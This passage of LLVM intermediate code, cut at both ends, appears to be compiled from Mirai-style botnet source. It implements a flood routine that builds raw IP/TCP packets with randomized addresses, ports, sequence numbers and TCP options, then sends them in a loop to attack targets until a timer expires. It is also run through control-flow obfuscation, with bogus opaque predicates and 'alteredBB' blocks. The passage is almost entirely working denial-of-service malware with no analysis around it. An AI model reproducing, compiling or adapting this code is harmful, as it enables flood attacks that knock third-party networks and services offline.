  %236 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 9
  store i32 %235, i32* %237, align 4
  %238 = load i16, i16* %26, align 2
  %239 = call zeroext i16 @htons(i16 zeroext %238) #7
  %240 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  store i16 %239, i16* %241, align 4
  %242 = load i16, i16* %27, align 2
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  %246 = load i32, i32* %28, align 4
  %247 = trunc i32 %246 to i16
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = zext i16 %248 to i32
  %250 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 2
  store i32 %249, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %254, -241
  %256 = or i16 %255, 160
  store i16 %256, i16* %253, align 4
  %257 = load i8, i8* %30, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = and i16 %258, 1
  %263 = shl i16 %262, 13
  %264 = and i16 %261, -8193
  %265 = or i16 %264, %263
  store i16 %265, i16* %260, align 4
  %266 = load i8, i8* %31, align 1
  %267 = sext i8 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %267, 1
  %272 = shl i16 %271, 12
  %273 = and i16 %270, -4097
  %274 = or i16 %273, %272
  store i16 %274, i16* %269, align 4
  %275 = load i8, i8* %32, align 1
  %276 = sext i8 %275 to i16
  %277 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = and i16 %276, 1
  %281 = shl i16 %280, 11
  %282 = and i16 %279, -2049
  %283 = or i16 %282, %281
  store i16 %283, i16* %278, align 4
  %284 = load i8, i8* %33, align 1
  %285 = sext i8 %284 to i16
  %286 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 4
  %288 = load i16, i16* %287, align 4
  %289 = and i16 %285, 1
  %290 = shl i16 %289, 10
  %291 = and i16 %288, -1025
  %292 = or i16 %291, %290
  store i16 %292, i16* %287, align 4
  %293 = load i8, i8* %34, align 1
  %294 = sext i8 %293 to i16
  %295 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 4
  %297 = load i16, i16* %296, align 4
  %298 = and i16 %294, 1
  %299 = shl i16 %298, 9
  %300 = and i16 %297, -513
  %301 = or i16 %300, %299
  store i16 %301, i16* %296, align 4
  %302 = load i8, i8* %35, align 1
  %303 = sext i8 %302 to i16
  %304 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = and i16 %303, 1
  %308 = shl i16 %307, 8
  %309 = and i16 %306, -257
  %310 = or i16 %309, %308
  store i16 %310, i16* %305, align 4
  %311 = load i8*, i8** %40, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %40, align 8
  store i8 2, i8* %311, align 1
  %313 = load i8*, i8** %40, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %40, align 8
  store i8 4, i8* %313, align 1
  %315 = call i32 @rand_next()
  %316 = and i32 %315, 15
  %317 = add i32 1400, %316
  %318 = trunc i32 %317 to i16
  %319 = call zeroext i16 @htons(i16 zeroext %318) #7
  %320 = load i8*, i8** %40, align 8
  %321 = bitcast i8* %320 to i16*
  store i16 %319, i16* %321, align 2
  %322 = load i8*, i8** %40, align 8
  %323 = getelementptr inbounds i8, i8* %322, i64 2
  store i8* %323, i8** %40, align 8
  %324 = load i8*, i8** %40, align 8
  %325 = getelementptr inbounds i8, i8* %324, i32 1
  store i8* %325, i8** %40, align 8
  store i8 4, i8* %324, align 1
  %326 = load i8*, i8** %40, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %40, align 8
  store i8 2, i8* %326, align 1
  %328 = load i8*, i8** %40, align 8
  %329 = getelementptr inbounds i8, i8* %328, i32 1
  store i8* %329, i8** %40, align 8
  store i8 8, i8* %328, align 1
  %330 = load i8*, i8** %40, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %40, align 8
  store i8 10, i8* %330, align 1
  %332 = call i32 @rand_next()
  %333 = load i8*, i8** %40, align 8
  %334 = bitcast i8* %333 to i32*
  store i32 %332, i32* %334, align 4
  %335 = load i8*, i8** %40, align 8
  %336 = getelementptr inbounds i8, i8* %335, i64 4
  store i8* %336, i8** %40, align 8
  %337 = load i8*, i8** %40, align 8
  %338 = bitcast i8* %337 to i32*
  store i32 0, i32* %338, align 4
  %339 = load i8*, i8** %40, align 8
  %340 = getelementptr inbounds i8, i8* %339, i64 4
  store i8* %340, i8** %40, align 8
  %341 = load i8*, i8** %40, align 8
  %342 = getelementptr inbounds i8, i8* %341, i32 1
  store i8* %342, i8** %40, align 8
  store i8 1, i8* %341, align 1
  %343 = load i8*, i8** %40, align 8
  %344 = getelementptr inbounds i8, i8* %343, i32 1
  store i8* %344, i8** %40, align 8
  store i8 3, i8* %343, align 1
  %345 = load i8*, i8** %40, align 8
  %346 = getelementptr inbounds i8, i8* %345, i32 1
  store i8* %346, i8** %40, align 8
  store i8 3, i8* %345, align 1
  %347 = load i8*, i8** %40, align 8
  %348 = getelementptr inbounds i8, i8* %347, i32 1
  store i8* %348, i8** %40, align 8
  store i8 6, i8* %347, align 1
  %349 = load i32, i32* @x.23
  %350 = load i32, i32* @y.24
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart2261, label %originalBB49alteredBB

originalBBpart2261:                               ; preds = %originalBB49
  br label %357

; <label>:357:                                    ; preds = %originalBBpart2261
  %358 = load i32, i32* %19, align 4
  %359 = add nsw i32 %358, 1
  store i32 %359, i32* %19, align 4
  br label %148

; <label>:360:                                    ; preds = %148
  %361 = load i32, i32* @x.23
  %362 = load i32, i32* @y.24
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBB263, label %originalBB263alteredBB

originalBB263:                                    ; preds = %originalBB263alteredBB, %360
  %369 = load i32, i32* @x.23
  %370 = load i32, i32* @y.24
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart2265, label %originalBB263alteredBB

originalBBpart2265:                               ; preds = %originalBB263
  br label %377

; <label>:377:                                    ; preds = %674, %originalBBpart2265
  store i32 0, i32* %19, align 4
  br label %378

; <label>:378:                                    ; preds = %originalBBpart2337, %377
  %379 = load i32, i32* %19, align 4
  %380 = load i8, i8* %15, align 1
  %381 = zext i8 %380 to i32
  %382 = icmp slt i32 %379, %381
  br i1 %382, label %383, label %652

; <label>:383:                                    ; preds = %378
  %384 = load i8**, i8*** %21, align 8
  %385 = load i32, i32* %19, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds i8*, i8** %384, i64 %386
  %388 = load i8*, i8** %387, align 8
  store i8* %388, i8** %41, align 8
  %389 = load i8*, i8** %41, align 8
  %390 = bitcast i8* %389 to %struct.iphdr*
  store %struct.iphdr* %390, %struct.iphdr** %42, align 8
  %391 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i64 1
  %393 = bitcast %struct.iphdr* %392 to %struct.tcphdr*
  store %struct.tcphdr* %393, %struct.tcphdr** %43, align 8
  %394 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %395 = load i32, i32* %19, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %394, i64 %396
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %397, i32 0, i32 2
  %399 = load i8, i8* %398, align 4
  %400 = zext i8 %399 to i32
  %401 = icmp slt i32 %400, 32
  br i1 %401, label %402, label %423

; <label>:402:                                    ; preds = %383
  %403 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %404 = load i32, i32* %19, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %403, i64 %405
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i32 0, i32 1
  %408 = load i32, i32* %407, align 4
  %409 = call i32 @ntohl(i32 %408) #7
  %410 = call i32 @rand_next()
  %411 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %412 = load i32, i32* %19, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i64 %413
  %415 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i32 0, i32 2
  %416 = load i8, i8* %415, align 4
  %417 = zext i8 %416 to i32
  %418 = lshr i32 %410, %417
  %419 = add i32 %409, %418
  %420 = call i32 @htonl(i32 %419) #7
  %421 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 9
  store i32 %420, i32* %422, align 4
  br label %423

; <label>:423:                                    ; preds = %402, %383
  %424 = load i32, i32* %36, align 4
  %425 = icmp eq i32 %424, -1
  br i1 %425, label %426, label %446

; <label>:426:                                    ; preds = %423
  %427 = load i32, i32* @x.23
  %428 = load i32, i32* @y.24
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB267, label %originalBB267alteredBB

originalBB267:                                    ; preds = %originalBB267alteredBB, %426
  %435 = call i32 @rand_next()
  %436 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 8
  store i32 %435, i32* %437, align 4
  %438 = load i32, i32* @x.23
  %439 = load i32, i32* @y.24
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart2269, label %originalBB267alteredBB

originalBBpart2269:                               ; preds = %originalBB267
  br label %446

; <label>:446:                                    ; preds = %originalBBpart2269, %423
  %447 = load i32, i32* @x.23
  %448 = load i32, i32* @y.24
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB271, label %originalBB271alteredBB

originalBB271:                                    ; preds = %originalBB271alteredBB, %446
  %455 = load i16, i16* %23, align 2
  %456 = zext i16 %455 to i32
  %457 = icmp eq i32 %456, 65535
  %458 = load i32, i32* @x.23
  %459 = load i32, i32* @y.24
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBBpart2273, label %originalBB271alteredBB

originalBBpart2273:                               ; preds = %originalBB271
  br i1 %457, label %466, label %488

; <label>:466:                                    ; preds = %originalBBpart2273
  %467 = load i32, i32* @x.23
  %468 = load i32, i32* @y.24
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB275, label %originalBB275alteredBB

originalBB275:                                    ; preds = %originalBB275alteredBB, %466
  %475 = call i32 @rand_next()
  %476 = and i32 %475, 65535
  %477 = trunc i32 %476 to i16
  %478 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 3
  store i16 %477, i16* %479, align 4
  %480 = load i32, i32* @x.23
  %481 = load i32, i32* @y.24
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBBpart2280, label %originalBB275alteredBB

originalBBpart2280:                               ; preds = %originalBB275
  br label %488

; <label>:488:                                    ; preds = %originalBBpart2280, %originalBBpart2273
  %489 = load i16, i16* %26, align 2
  %490 = zext i16 %489 to i32
  %491 = icmp eq i32 %490, 65535
  br i1 %491, label %492, label %514

; <label>:492:                                    ; preds = %488
  %493 = load i32, i32* @x.23
  %494 = load i32, i32* @y.24
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %492
  %501 = call i32 @rand_next()
  %502 = and i32 %501, 65535
  %503 = trunc i32 %502 to i16
  %504 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %505 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %504, i32 0, i32 0
  store i16 %503, i16* %505, align 4
  %506 = load i32, i32* @x.23
  %507 = load i32, i32* @y.24
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBBpart2291, label %originalBB282alteredBB

originalBBpart2291:                               ; preds = %originalBB282
  br label %514

; <label>:514:                                    ; preds = %originalBBpart2291, %488
  %515 = load i16, i16* %27, align 2
  %516 = zext i16 %515 to i32
  %517 = icmp eq i32 %516, 65535
  br i1 %517, label %518, label %540

; <label>:518:                                    ; preds = %514
  %519 = load i32, i32* @x.23
  %520 = load i32, i32* @y.24
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBB293, label %originalBB293alteredBB

originalBB293:                                    ; preds = %originalBB293alteredBB, %518
  %527 = call i32 @rand_next()
  %528 = and i32 %527, 65535
  %529 = trunc i32 %528 to i16
  %530 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 1
  store i16 %529, i16* %531, align 2
  %532 = load i32, i32* @x.23
  %533 = load i32, i32* @y.24
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBBpart2301, label %originalBB293alteredBB

originalBBpart2301:                               ; preds = %originalBB293
  br label %540

; <label>:540:                                    ; preds = %originalBBpart2301, %514
  %541 = load i32, i32* %28, align 4
  %542 = icmp eq i32 %541, 65535
  br i1 %542, label %543, label %563

; <label>:543:                                    ; preds = %540
  %544 = load i32, i32* @x.23
  %545 = load i32, i32* @y.24
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBB303, label %originalBB303alteredBB

originalBB303:                                    ; preds = %originalBB303alteredBB, %543
  %552 = call i32 @rand_next()
  %553 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 2
  store i32 %552, i32* %554, align 4
  %555 = load i32, i32* @x.23
  %556 = load i32, i32* @y.24
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBBpart2305, label %originalBB303alteredBB

originalBBpart2305:                               ; preds = %originalBB303
  br label %563

; <label>:563:                                    ; preds = %originalBBpart2305, %540
  %564 = load i32, i32* %29, align 4
  %565 = icmp eq i32 %564, 65535
  br i1 %565, label %566, label %570

; <label>:566:                                    ; preds = %563
  %567 = call i32 @rand_next()
  %568 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 3
  store i32 %567, i32* %569, align 4
  br label %570

; <label>:570:                                    ; preds = %566, %563
  %571 = load i8, i8* %30, align 1
  %572 = icmp ne i8 %571, 0
  br i1 %572, label %573, label %595

; <label>:573:                                    ; preds = %570
  %574 = load i32, i32* @x.23
  %575 = load i32, i32* @y.24
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBB307, label %originalBB307alteredBB

originalBB307:                                    ; preds = %originalBB307alteredBB, %573
  %582 = call i32 @rand_next()
  %583 = and i32 %582, 65535
  %584 = trunc i32 %583 to i16
  %585 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %586 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %585, i32 0, i32 7
  store i16 %584, i16* %586, align 2
  %587 = load i32, i32* @x.23
  %588 = load i32, i32* @y.24
  %589 = sub i32 %587, 1
  %590 = mul i32 %587, %589
  %591 = urem i32 %590, 2
  %592 = icmp eq i32 %591, 0
  %593 = icmp slt i32 %588, 10
  %594 = or i1 %592, %593
  br i1 %594, label %originalBBpart2319, label %originalBB307alteredBB

originalBBpart2319:                               ; preds = %originalBB307
  br label %595

; <label>:595:                                    ; preds = %originalBBpart2319, %570
  %596 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %597 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %596, i32 0, i32 7
  store i16 0, i16* %597, align 2
  %598 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %599 = bitcast %struct.iphdr* %598 to i16*
  %600 = call zeroext i16 @checksum_generic(i16* %599, i32 20)
  %601 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %602 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %601, i32 0, i32 7
  store i16 %600, i16* %602, align 2
  %603 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %604 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %603, i32 0, i32 6
  store i16 0, i16* %604, align 4
  %605 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %606 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %607 = bitcast %struct.tcphdr* %606 to i8*
  %608 = call zeroext i16 @htons(i16 zeroext 40) #7
  %609 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %605, i8* %607, i16 zeroext %608, i32 40)
  %610 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %611 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %610, i32 0, i32 6
  store i16 %609, i16* %611, align 4
  %612 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 1
  %614 = load i16, i16* %613, align 2
  %615 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %616 = load i32, i32* %19, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %615, i64 %617
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %618, i32 0, i32 0
  %620 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %619, i32 0, i32 1
  store i16 %614, i16* %620, align 2
  %621 = load i32, i32* %20, align 4
  %622 = load i8*, i8** %41, align 8
  %623 = bitcast %union.__CONST_SOCKADDR_ARG* %44 to %struct.sockaddr**
  %624 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %625 = load i32, i32* %19, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %624, i64 %626
  %628 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %627, i32 0, i32 0
  %629 = bitcast %struct.sockaddr_in* %628 to %struct.sockaddr*
  store %struct.sockaddr* %629, %struct.sockaddr** %623, align 8
  %630 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %44, i32 0, i32 0
  %631 = load %struct.sockaddr*, %struct.sockaddr** %630, align 8
  %632 = call i64 @sendto(i32 %621, i8* %622, i64 60, i32 16384, %struct.sockaddr* %631, i32 16)
  br label %633

; <label>:633:                                    ; preds = %595
  %634 = load i32, i32* @x.23
  %635 = load i32, i32* @y.24
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBB321, label %originalBB321alteredBB

originalBB321:                                    ; preds = %originalBB321alteredBB, %633
  %642 = load i32, i32* %19, align 4
  %643 = add nsw i32 %642, 1
  store i32 %643, i32* %19, align 4
  %644 = load i32, i32* @x.23
  %645 = load i32, i32* @y.24
  %646 = sub i32 %644, 1
  %647 = mul i32 %644, %646
  %648 = urem i32 %647, 2
  %649 = icmp eq i32 %648, 0
  %650 = icmp slt i32 %645, 10
  %651 = or i1 %649, %650
  br i1 %651, label %originalBBpart2337, label %originalBB321alteredBB

originalBBpart2337:                               ; preds = %originalBB321
  br label %378

; <label>:652:                                    ; preds = %378
  %653 = load i32, i32* @x.23
  %654 = load i32, i32* @y.24
  %655 = sub i32 %653, 1
  %656 = mul i32 %653, %655
  %657 = urem i32 %656, 2
  %658 = icmp eq i32 %657, 0
  %659 = icmp slt i32 %654, 10
  %660 = or i1 %658, %659
  br i1 %660, label %originalBB339, label %originalBB339alteredBB

originalBB339:                                    ; preds = %originalBB339alteredBB, %652
  %661 = call i64 @time(i64* null) #6
  %662 = load i32, i32* %37, align 4
  %663 = sext i32 %662 to i64
  %664 = icmp sgt i64 %661, %663
  %665 = load i32, i32* @x.23
  %666 = load i32, i32* @y.24
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBBpart2341, label %originalBB339alteredBB

originalBBpart2341:                               ; preds = %originalBB339
  br i1 %664, label %673, label %674

; <label>:673:                                    ; preds = %originalBBpart2341
  br label %675

; <label>:674:                                    ; preds = %originalBBpart2341
  br label %377

; <label>:675:                                    ; preds = %673, %128, %122
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %676 = alloca i32, align 4
  %677 = alloca i8, align 1
  %678 = alloca %struct.attack_target*, align 8
  %679 = alloca i8, align 1
  %680 = alloca %struct.attack_option*, align 8
  %681 = alloca i32, align 4
  %682 = alloca i32, align 4
  %683 = alloca i8**, align 8
  %684 = alloca i8, align 1
  %685 = alloca i16, align 2
  %686 = alloca i8, align 1
  %687 = alloca i8, align 1
  %688 = alloca i16, align 2
  %689 = alloca i16, align 2
  %690 = alloca i32, align 4
  %691 = alloca i32, align 4
  %692 = alloca i8, align 1
  %693 = alloca i8, align 1
  %694 = alloca i8, align 1
  %695 = alloca i8, align 1
  %696 = alloca i8, align 1
  %697 = alloca i8, align 1
  %698 = alloca i32, align 4
  %699 = alloca i32, align 4
  %700 = alloca %struct.iphdr*, align 8
  %701 = alloca %struct.tcphdr*, align 8
  %702 = alloca i8*, align 8
  %703 = alloca i8*, align 8
  %704 = alloca %struct.iphdr*, align 8
  %705 = alloca %struct.tcphdr*, align 8
  %706 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %676, align 4
  store i8 %1, i8* %677, align 1
  store %struct.attack_target* %2, %struct.attack_target** %678, align 8
  store i8 %3, i8* %679, align 1
  store %struct.attack_option* %4, %struct.attack_option** %680, align 8
  store i32 0, i32* %681, align 4
  store i32 0, i32* %682, align 4
  %707 = load i8, i8* %677, align 1
  %708 = zext i8 %707 to i64
  %709 = call noalias i8* @calloc(i64 %708, i64 8) #6
  %710 = bitcast i8* %709 to i8**
  store i8** %710, i8*** %683, align 8
  %711 = load i8, i8* %679, align 1
  %712 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %713 = call i32 @attack_get_opt_int(i8 zeroext %711, %struct.attack_option* %712, i8 zeroext 2, i32 0)
  %714 = trunc i32 %713 to i8
  store i8 %714, i8* %684, align 1
  %715 = load i8, i8* %679, align 1
  %716 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %717 = call i32 @attack_get_opt_int(i8 zeroext %715, %struct.attack_option* %716, i8 zeroext 3, i32 65535)
  %718 = trunc i32 %717 to i16
  store i16 %718, i16* %685, align 2
  %719 = load i8, i8* %679, align 1
  %720 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %721 = call i32 @attack_get_opt_int(i8 zeroext %719, %struct.attack_option* %720, i8 zeroext 4, i32 64)
  %722 = trunc i32 %721 to i8
  store i8 %722, i8* %686, align 1
  %723 = load i8, i8* %679, align 1
  %724 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %725 = call i32 @attack_get_opt_int(i8 zeroext %723, %struct.attack_option* %724, i8 zeroext 5, i32 1)
  %726 = trunc i32 %725 to i8
  store i8 %726, i8* %687, align 1
  %727 = load i8, i8* %679, align 1
  %728 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %729 = call i32 @attack_get_opt_int(i8 zeroext %727, %struct.attack_option* %728, i8 zeroext 6, i32 65535)
  %730 = trunc i32 %729 to i16
  store i16 %730, i16* %688, align 2
  %731 = load i8, i8* %679, align 1
  %732 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %733 = call i32 @attack_get_opt_int(i8 zeroext %731, %struct.attack_option* %732, i8 zeroext 7, i32 65535)
  %734 = trunc i32 %733 to i16
  store i16 %734, i16* %689, align 2
  %735 = load i8, i8* %679, align 1
  %736 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %737 = call i32 @attack_get_opt_int(i8 zeroext %735, %struct.attack_option* %736, i8 zeroext 16, i32 65535)
  store i32 %737, i32* %690, align 4
  %738 = load i8, i8* %679, align 1
  %739 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %740 = call i32 @attack_get_opt_int(i8 zeroext %738, %struct.attack_option* %739, i8 zeroext 17, i32 0)
  store i32 %740, i32* %691, align 4
  %741 = load i8, i8* %679, align 1
  %742 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %743 = call i32 @attack_get_opt_int(i8 zeroext %741, %struct.attack_option* %742, i8 zeroext 10, i32 0)
  %744 = trunc i32 %743 to i8
  store i8 %744, i8* %692, align 1
  %745 = load i8, i8* %679, align 1
  %746 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %747 = call i32 @attack_get_opt_int(i8 zeroext %745, %struct.attack_option* %746, i8 zeroext 11, i32 0)
  %748 = trunc i32 %747 to i8
  store i8 %748, i8* %693, align 1
  %749 = load i8, i8* %679, align 1
  %750 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %751 = call i32 @attack_get_opt_int(i8 zeroext %749, %struct.attack_option* %750, i8 zeroext 12, i32 0)
  %752 = trunc i32 %751 to i8
  store i8 %752, i8* %694, align 1
  %753 = load i8, i8* %679, align 1
  %754 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %755 = call i32 @attack_get_opt_int(i8 zeroext %753, %struct.attack_option* %754, i8 zeroext 13, i32 0)
  %756 = trunc i32 %755 to i8
  store i8 %756, i8* %695, align 1
  %757 = load i8, i8* %679, align 1
  %758 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %759 = call i32 @attack_get_opt_int(i8 zeroext %757, %struct.attack_option* %758, i8 zeroext 14, i32 1)
  %760 = trunc i32 %759 to i8
  store i8 %760, i8* %696, align 1
  %761 = load i8, i8* %679, align 1
  %762 = load %struct.attack_option*, %struct.attack_option** %680, align 8
